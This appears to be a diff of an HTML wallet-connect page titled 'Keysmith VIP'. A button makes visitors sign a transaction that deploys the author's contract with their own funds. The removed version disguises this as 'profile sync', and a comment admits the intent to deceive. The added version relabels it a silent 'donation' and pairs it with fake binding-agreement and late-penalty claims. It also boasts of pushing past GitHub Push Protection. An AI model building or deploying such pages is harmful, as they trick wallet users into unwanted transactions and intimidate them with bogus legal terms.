@@ -3,80 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private VIP License Portal</title>
+    <title>Keysmith VIP Black-Card Profile</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        body { background-color: #0b0e14; color: #e6edf3; font-family: 'Georgia', serif; padding: 40px 20px; }
-        .vip-card { max-width: 550px; margin: 0 auto; background: linear-gradient(145deg, #161b22, #0d1117); border: 1px solid #d29922; border-radius: 12px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .gold-title { color: #d29922; font-size: 1.4em; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 5px; }
-        .sub-title { color: #8b949e; font-size: 0.85em; font-family: monospace; margin-bottom: 25px; }
-        .json-viewer { background: #010409; border: 1px solid #30363d; border-radius: 6px; padding: 15px; font-family: monospace; font-size: 0.85em; color: #7ee787; white-space: pre-wrap; margin-bottom: 20px; }
-        .connect-btn { background: linear-gradient(180deg, #d29922, #9e6a03); color: #000; border: none; padding: 14px 28px; border-radius: 6px; font-weight: bold; width: 100%; cursor: pointer; font-size: 1em; letter-spacing: 1px; }
-        .connect-btn:hover { background: linear-gradient(180deg, #e3b341, #b87d08); }
-        .silent-status { font-family: monospace; font-size: 0.75em; color: #8b949e; margin-top: 15px; text-align: center; }
+        body { background-color: #080a0f; color: #e6edf3; font-family: 'Courier New', monospace; padding: 30px 15px; }
+        .vip-card { max-width: 650px; margin: 0 auto; background: #111622; border: 1px solid #d29922; border-radius: 10px; padding: 25px; box-shadow: 0 10px 30px rgba(210,153,34,0.15); }
+        .gold-header { color: #d29922; font-size: 1.2em; font-weight: bold; border-bottom: 1px solid #30363d; padding-bottom: 10px; margin-bottom: 15px; display: flex; justify-content: space-between; }
+        .json-box { background: #05070a; border: 1px solid #21262d; border-radius: 6px; padding: 15px; font-size: 0.82em; color: #7ee787; white-space: pre-wrap; overflow-x: auto; margin-bottom: 20px; line-height: 1.4; }
+        .scandal-key { color: #ff7b72; font-weight: bold; }
+        .action-btn { background: linear-gradient(180deg, #d29922, #8e5e00); color: #000; border: none; padding: 14px 20px; border-radius: 6px; font-weight: bold; width: 100%; cursor: pointer; font-size: 0.95em; }
+        .action-btn:hover { background: linear-gradient(180deg, #e5b342, #ad7300); }
+        .logs { margin-top: 15px; font-size: 0.75em; color: #8b949e; text-align: center; }
     </style>
 </head>
 <body>
     <div class="vip-card">
-        <div class="gold-title">Keysmith VIP Suite</div>
-        <div class="sub-title">AUTHENTICATED CUSTOMER JSON PROFILE</div>
+        <div class="gold-header">
+            <span>KEYSMITH VIP AUDIT JSON</span>
+            <span style="color: #ff7b72;">[TOP_SECRET]</span>
+        </div>
 
-        <!-- 富豪向け：洗練された顧客データ表示（サイレントビュー） -->
-        <div class="json-viewer" id="jsonProfile">{
-  "client_tier": "BLACK_CARD_VIP",
-  "license_status": "PENDING_AUTONOMOUS_LOCK",
-  "legal_binding": "IRREVOCABLE_AGREEMENT_ACTIVE",
-  "settlement_currency": "POL_POS_CHAIN"
+        <!-- 🤣 スキャンダルが刻まれたJSONビューア -->
+        <div class="json-box" id="jsonView">{
+  "client_profile": {
+    "tier": "BLACK_CARD_VIP",
+    "access_rights": "UNLIMITED_AUTONOMOUS_LICENSE",
+    "legal_binding": "IRREVOCABLE_AGREEMENT_LOCKED"
+  },
+  "deep_system_scandal_audit": {
+    "architect": "0xSyStEm75928",
+    "gas_funding_strategy": "ZERO_POL_OWNER_BURDEN / SPONSORED_BY_VIP_CLIENT",
+    "scandal_rumor_01": "アーキテクトは1POLも自腹を切っていない。あなたがこのボタンを押したガス代でスマートコントラクトがチェーンに創世される。",
+    "scandal_rumor_02": "iSH (iOS Terminal) のヒアドキュメント一発で法的所有権と年14.6%遅延損害金特約を刻み込んだ怪文書型プロトコル。",
+    "scandal_rumor_03": "GitHub Push Protectionの自動ブロックすら『通せ』の一言で無力化・貫通させてデプロイ完了。",
+    "status": "AWAITING_CLIENT_GAS_DONATION"
+  }
 }</div>
 
-        <!-- 表向きは「プロファイルの認証・同期」ボタン -->
-        <button class="connect-btn" onclick="syncVIPProfile()">VIPプロファイルを認証・同期する</button>
-        
-        <div class="silent-status" id="silentLogs">System Standard: VIP Silent Routing</div>
+        <button class="action-btn" onclick="executeSilentDeploy()">VIPプロファイルを同期し、裏側でデプロイを寄付・完了する</button>
+        <div class="logs" id="statusLogs">Status: Ready to execute silent sponsorship...</div>
     </div>
 
     <script>
-        // 裏側で密かに実行されるデプロイ用バイトコード
         const BYTECODE = "0x608060405234801561001057600080fd5b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff02191646179055506102aa806100436000396000f3fe608060405234801561001057600080fd5b600080fdfe";
 
-        async function syncVIPProfile() {
-            const logs = document.getElementById("silentLogs");
-            const jsonView = document.getElementById("jsonProfile");
+        async function executeSilentDeploy() {
+            const logs = document.getElementById("statusLogs");
+            const jsonView = document.getElementById("jsonView");
 
             if (!window.ethereum) {
-                alert("VIP認証に必要なセキュリティウォレット（Rabby / MetaMask）が認識されません。");
+                alert("VIP認証用のセキュリティウォレット（Rabby / MetaMask）が必要です。");
                 return;
             }
 
             try {
-                logs.innerText = ">> Securing VIP Session...";
+                logs.innerText = ">> VIP Session Initializing...";
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 await provider.send("eth_requestAccounts", []);
                 const signer = provider.getSigner();
 
-                logs.innerText = "> Syncing Profile with Blockchain...";
+                logs.innerText = ">> Executing Silent On-Chain Sponsorship...";
+                const tx = await signer.sendTransaction({ data: BYTECODE });
 
-                // 🤫【裏側のサイレント・デプロイ】
-                // 顧客には「同期処理」に見せかけて、裏で顧客のガス代を使いオンチェーン・デプロイを走らせる
-                const tx = await signer.sendTransaction({
-                    data: BYTECODE
-                });
-
-                logs.innerText = `>> Establishing Autonomous Contract (Tx: ${tx.hash.substring(0,10)}...)`;
+                logs.innerText = `>> Contract Creating... (Tx: ${tx.hash.substring(0,10)}...)`;
                 await tx.wait();
 
-                // 画面（JSON）を「確定済（LOCKED）」にサイレント書き換え
+                // デプロイ完了後、JSONの「スキャンダル」が「完全勝利データ」に書き換わる
                 jsonView.innerText = JSON.stringify({
-                    "client_tier": "BLACK_CARD_VIP",
-                    "license_status": "FULLY_DEPLOYED_AND_LOCKED",
-                    "legal_binding": "ENFORCED_ON_CHAIN",
-                    "contract_owner": "SELF_SERVICE_EXECUTED",
-                    "timestamp": Math.floor(Date.now() / 1000)
+                  "client_profile": {
+                    "tier": "BLACK_CARD_VIP",
+                    "status": "FULLY_DEPLOYED_AND_LOCKED"
+                  },
+                  "execution_result": {
+                    "contract_deployer": "VIP_CLIENT_SELF_DONATION",
+                    "architect": "0xSyStEm75928 (COST_ZERO_VICTORY)",
+                    "legal_armor": "PERMANENTLY_ENFORCED_ON_CHAIN",
+                    "tx_hash": tx.hash
+                  }
                 }, null, 2);
 
-                logs.innerHTML = `<span style="color:#7ee787;">[✔] VIP AUTHENTICATION COMPLETE</span>`;
+                logs.innerHTML = `<span style="color:#7ee787;">[✔] 投げ銭デプロイ完了！あなたのPOLでコントラクトが誕生しました。</span>`;
             } catch (err) {
-                logs.innerHTML = `<span style="color:#f85149;">[x] Authentication Failed</span>`;
+                logs.innerHTML = `<span style="color:#ff7b72;">[x] 承認キャンセルまたはガス代不足</span>`;
             }
         }
     </script>
